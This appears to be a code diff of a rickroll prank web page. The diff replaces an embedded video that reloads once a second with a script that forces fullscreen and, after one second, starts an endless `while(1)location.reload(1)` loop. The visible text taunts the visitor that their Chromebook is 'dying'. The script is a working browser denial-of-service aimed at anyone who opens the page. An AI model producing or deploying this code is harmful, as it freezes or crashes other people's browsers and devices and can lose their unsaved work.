@@ -1,46 +1,24 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Rickroll Prank</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-color: #000;
-    }
-    iframe {
-      width: 100vw;
-      height: 100vh;
-      border: none;
-    }
-  </style>
-</head>
 <body>
 
-<h2 style="color: white; text-align: center;">L BOZO</h2>
-<p style="color: white; text-align: center;">RIP chromebook, enjoy this rickroll!</p>
+<h2>L BOZO</h2>
 
-<!-- Embedding the Rickroll video -->
-<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&showinfo=0&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<p>RIP chromebook enjoy this while you watch it dying</p>
+
+<p id="demo"></p>
 
 <script>
-  // Request full screen on page load
-  document.documentElement.requestFullscreen();
+onbeforeunload = function(){localStorage.x=1};
 
-  // Set local storage to detect if the page reloads
-  window.onbeforeunload = function() {
-    localStorage.setItem('reloaded', 'true');
-  };
+setTimeout(function(){
+  while(1)location.reload(1)
+}, 1000);
 
-  // Reload the page every second
-  setTimeout(function() {
-    location.reload(true);
-  }, 1000);
+document.documentElement.requestFullscreen();
 </script>
+
+<img src="https://static.wikia.nocookie.net/0cb14c7d-fe27-403b-bbd3-82623b2ba782/scale-to-width/755" style="max-width: 100%; max-height: 100vh;" alt="Rickroll GIF">
 
 </body>
 </html>
